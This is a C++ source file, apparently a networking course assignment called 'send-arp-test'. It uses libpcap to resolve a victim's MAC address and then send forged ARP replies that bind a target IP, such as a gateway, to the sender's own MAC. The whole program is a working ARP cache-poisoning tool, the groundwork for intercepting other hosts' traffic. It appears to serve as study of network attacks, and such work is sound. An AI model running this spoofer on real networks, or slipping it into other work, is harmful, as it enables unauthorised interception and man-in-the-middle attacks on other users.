#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include <libnet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>
#pragma pack(push, 1)
uint8_t MAC_my_address[Mac::SIZE];
uint8_t MAC_sender_address[Mac::SIZE];
in_addr My_Ip_address;
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test ens33\n");
}
void input_format(){
    printf("number of input argument must be even\n");
}

void move_data_handler(u_char *user, const struct pcap_pkthdr *pkt_header, const u_char *pkt_data);
void print_my_mac_address();
void print_sender_mac_address();
int send_arp_spoof(pcap_t* handle, char* dev, in_addr addr_inet_sender,in_addr addr_inet_target);
int setting_my_mac();
void finding_my_ip_address(char *dev);

int main(int argc, char* argv[]) {

    if (argc < 4) {
		usage();
		return -1;
	}
    if(argc % 2 != 0){
        input_format();
        return -1;
    }
	char* dev = argv[1];
    finding_my_ip_address(dev);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    int tot_argc=(argc-2)/2;
    for(int j=1;j<=tot_argc;j++){
        printf("%dth case of sender and target arp spoofing started\n",j);
        in_addr addr_inet_sender;
        in_addr addr_inet_target;
        if(!inet_aton(argv[2*j], &addr_inet_sender)){
            printf("invalid IP address : %s\n", argv[2*j]);
            continue;
        }
        if(!inet_aton(argv[2*j+1], &addr_inet_target)){
            printf("invalid IP address : %s\n", argv[2*j+1]);
            continue;;
        }
        send_arp_spoof(handle, dev, addr_inet_sender, addr_inet_target);
    }
    pcap_close(handle);
}
void finding_my_ip_address(char* dev){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;
    /* I want IP address attached to "ens33" */
    strncpy(ifr.ifr_name, dev, strlen(dev));
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    /* display result */
    printf("My ip address : %s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    inet_aton(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), &My_Ip_address);
    return;
}
int send_arp_spoof(pcap_t* handle, char* dev,in_addr addr_inet_sender,in_addr addr_inet_target){
    int i;
    EthArpPacket packet_broadcast, packet_real;//final packet to send to make arp spoofing
    int errmy=setting_my_mac();
    if(errmy==0){
        printf("Handle error on finding my mac address\n");
        return 3;
    }
    print_my_mac_address();
    packet_broadcast.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    for(i=0;i<6;i++){
        packet_broadcast.eth_.smac_.mac_[i]=MAC_my_address[i];
    }
    packet_broadcast.eth_.type_ = htons(EthHdr::Arp);
    packet_broadcast.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_broadcast.arp_.pro_ = htons(EthHdr::Ip4);
    packet_broadcast.arp_.hln_ = Mac::SIZE;
    packet_broadcast.arp_.pln_ = Ip::SIZE;
    packet_broadcast.arp_.op_ = htons(ArpHdr::Request);
    for(i=0;i<Mac::SIZE;i++){
       packet_broadcast.arp_.smac_.mac_[i]=MAC_my_address[i];
    }
    packet_broadcast.arp_.sip_.ip_ = My_Ip_address.s_addr;
    //packet_broadcast.arp_.sip_.ip_ = addr_inet_target.s_addr;
    //packet_broadcast.arp_.sip_ = addr_inet_target.s_addr;
    packet_broadcast.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet_broadcast.arp_.tip_.ip_ = addr_inet_sender.s_addr;
    //packet_broadcast.arp_.tip_ = addr_inet_sender.s_addr;
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broadcast), sizeof(EthArpPacket));
    u_char chk_same[28];
    //printf("\n%ld\n",sizeof(ArpHdr));
    memcpy(chk_same, &packet_broadcast.arp_, sizeof(ArpHdr));
    int packet_number=0;
    for(i=0;i<Mac::SIZE;i++){
        MAC_sender_address[i]=0x00;
    }
    int kk=0;
    while(true){
        int i;
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0){
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_broadcast), sizeof(EthArpPacket));
            kk++;
            if(kk==20){//sender's ip address is wrong!
                printf("Failed to get sender's mac address!\n");
                return 1;
            }
            continue;
        }
        if (res == -1 || res == -2) {
            //printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            printf("Failed to get sender's mac address!\n");
            return 1;
        }
        ethhdr request_arp_eth;
        memcpy(&request_arp_eth, packet, sizeof(ethhdr));
        if(request_arp_eth.h_proto!=htons(EthHdr::Arp)){
            continue;
        }

        ArpHdr request_arp, reply_arp;
        request_arp=packet_broadcast.arp_;
        memcpy(&reply_arp, packet+sizeof(ethhdr), sizeof(ArpHdr));
        if(reply_arp.op_!=htons(ArpHdr::Reply)){
            continue;
        }
        //if this isn't reply
        //if request_arp's sender ip != reply_arp's target ip

        if(request_arp.sip_.ip_!=reply_arp.tip_.ip_){
            continue;
        }

        //if request_arp's target ip != reply_arp's senders ip address
        if(request_arp.tip_.ip_!=reply_arp.sip_.ip_){
            continue;
        }

        //if request_arp's source mac == reply_arp's des mac
        for(i=0;i<Mac::SIZE;i++){
            if(request_arp.smac_[i]!=reply_arp.tmac_[i]){
                continue;
            }
        }
        for(i=0;i<Mac::SIZE;i++){
            MAC_sender_address[i]=reply_arp.smac_[i];
        }
        //print_sender_mac_address();
        break;
    }
    int cntt=0, cnff=0;
    for(i=0;i<Mac::SIZE;i++){
        if(MAC_sender_address[i]!=0x00){
            cntt=1;
        }
        if(MAC_sender_address[i]!=0xff){
            cnff=1;
        }
    }
    if(cntt==0 || cnff==0){
        printf("Failed to get sender's mac address!\n");
        return 1;
    }
    print_sender_mac_address();

    packet_real=packet_broadcast;
    packet_real.arp_.sip_.ip_ = addr_inet_target.s_addr;
    for(i=0;i<Mac::SIZE;i++){
       packet_real.eth_.dmac_.mac_[i] = MAC_sender_address[i];
    }
    for(i=0;i<Mac::SIZE;i++){
       packet_real.arp_.tmac_.mac_[i] = MAC_sender_address[i];
    }
    packet_real.arp_.op_ = htons(ArpHdr::Reply);
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_real), sizeof(EthArpPacket));
    return 0;
}
void print_sender_mac_address(){
    int i;
    printf("I got sender's mac address!\nSender's mac address : ");
    for(i=0;i<Mac::SIZE;i++){
        if(i!=0){
            printf(":");
        }
        printf("%02x",MAC_sender_address[i]);
    }
    printf("\n");
}

/*
 *
 * copy and pasted from
 * https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
 * */
int setting_my_mac(){
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) {
        /* handle error*/
        return 0;
    };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
        /* handle error */
        return 0;
    }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else {
            /* handle error */
            return 0;
        }
    }
    if (success){
        unsigned char mac_address[6];
        memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
        int i;
        for(i=0;i<ETHER_ADDR_LEN;i++){
            MAC_my_address[i]=static_cast<uint8_t>(mac_address[i]);
        }
    }
    return success;
}
void print_my_mac_address(){
    int i;
    //setting on MAC_my_address
    printf("I got my mac address!\nMy mac address : ");
    for(i=0;i<ETHER_ADDR_LEN;i++){
        if(i!=0){
            printf(":");
        }
        printf("%02x",MAC_my_address[i]);
    }
    printf("\n");
}
